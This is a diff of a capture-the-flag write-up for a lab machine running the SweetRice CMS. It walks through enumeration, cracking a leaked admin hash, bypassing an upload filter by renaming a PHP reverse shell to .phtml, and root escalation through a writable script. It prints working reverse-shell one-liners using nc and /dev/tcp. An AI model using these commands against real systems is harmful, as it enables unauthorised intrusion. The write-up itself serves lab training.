@@ -9,36 +9,178 @@ comments: false
 
 #LAZY ADMIN WRITEUP 
 
--Found port 22/80 open with nmap
--enumerated directories with dirb
--/content shows site is running CMS sweetRice
--found login page at /content/as -
-- tried basic sql injection -- failed
--tried sweetrice online file upload vulnerability
--found directory list and site map at /content/inc
--found sql database backup file
--found entry for admin with hashed password
+
+
+
+
+
+We start off running an Nmap scan to enumerate the open ports
+
+>nmap -sCV x.x.x.x
+
+We can see that ports 22 & 80 are open in the nmap scan below
+
+*************** 1
+
+
+
+Navigating to the webpage shows us a basic apache webserver page
+Lets enumerated directories and subdirectories with [dirb](https://www.kali.org/tools/dirb/)
+
+> dirb http://x.x.x.x
+
+
+We can see in the screenshot below that there are a few directories of interest
+
+************* 2 
+
+
+Navigating to "/content" show us that this site is running CMS sweetRice and not fully developed
+Lets see if there are any obvious vulnerabilities that have not yet been patched
+
+************** 3
+
+
+Moving further into the directory into the "/content/as" page shows us that there is a login page
+
+
+
+************** 4 
+
+
+I tested different credentials as well as a sqli injection but did not have any success
+I also found a "sweetrice" file upload vulnerability that may be possible, but also could not find a working exploit for this
+
+Going back to the dirb scan I inspected alternate web pages that were enumerated
+Navigating to "/content/inc" we find a directory list and site map!
+We show 30 different files and direrectories here but one caught my eye... 
+mysql_backup/
+
+************** 5
+
+
+
+*************** 6 
+
+
+Lets download this file and inspect it ...
+
+*************** 7
+
+
+Looking at this file we can see that it shows us an admin username and hashed password
+
+
+
+*************** 8
+
 
 admin
 manager
-42f749ade7f9e195bf475f37a44cafcb = Password123
-
--cracked hash with online crack tool
--tried admin -- failed-
--tried manager - WORKED!!!
-
--tried to upload reverse php shell - failed - no shell
--created new reverse shell - fatrat- php - laptop died - 
--used pentestmonkey reverse php shell - uploaded to media form
--used burpsuite to modify to request to bypyass filter and sent form and .phtml instead of .php
--GOT USER FLAG
+42f749ade7f9e195bf475f37a44cafcb 
 
 
--sudo -l shows that there is a 'backup.pl" file which shows /etc/copy.sh
--/etc/copy is a reverse shell script to complete a connection for a remote listener
--modified script to point to my ip
--ran command "sudo perl /home/itguy/backup.pl
--used alternate port to complete connection
--received root reverse shell
+Lets try to crack this hash first with an online crack tool
+Using [haches.com](https://hashes.com/en/decrypt/hash)
+We are able to crack the hash 
 
-catted out /root/root.txt to get ROOT FLAG
+
+*************** 9
+
+>Password123
+
+Let's try to Login with the new credentials at the login page...
+>Account: manager
+>Password: [cracked hashed password]
+
+*************** 10
+
+SUCCESS !
+
+looking around this page for potential vulnerabilites,
+We can see there is the option to upload files in the "MEDIA CENTER" page
+
+*************** 11
+
+
+Lets try and upload a known malicious file...
+I tried to upload the php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
+Not forgetting to modify the IP and port to point to your machine and listener
+This hoever failed and did not upload successfully 
+We can see that there is a filter in place preventing our upload
+Let's try and modify the request and see if we can bypass the filter
+.........................................
+Using [Burpsuite](https://portswigger.net/burp/communitydownload)
+Lets reload and capture the page in order to modify the request
+Let's try to change the request from .php to .phtml and forward the request
+
+*************** 12
+
+We can see that this was succfully uploaded and bypassed the filter
+
+*************** 13
+
+Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link
+WE now get a successful shell on our machine to the target machine
+Lets move into the /home directory and capture our root flag
+
+
+*************** 14
+
+> Flag: THM{redacted}
+
+
+_________________
+
+We now got the User Flag
+Lets try and escalate our privilege to get the root flag...
+
+
+>sudo -l 
+
+Running the command above shows that itguy can run a perl script called 'backup.pl' as root
+It appears to executes a bash script named '/etc/copy.sh'
+Looking inside we see there is a  file which shows a script being run
+
+*************** 15
+
+>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+
+Lets modify it to point to our IP and port of our listener 
+
+> echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" > copy.sh
+
+
+*Remember we are already connected on the port we originally chose...
+*So we will need to start a second listener and a different port from the first listener we set up
+
+*************** 16 ??
+
+Lets run the command below to start the script
+
+
+>$sudo /usr/bin/perl /home/itguy/backup.pl
+
+
+We now get our reverse shell as root !!!
+Lets cat out /root/root.txt to capture the ROOT FLAG
+
+
+*************** 17
+
+We have now captured the root flag and pwnd the machine
+
+
+
+
+
+
+
+
+
+
+
+
+
+
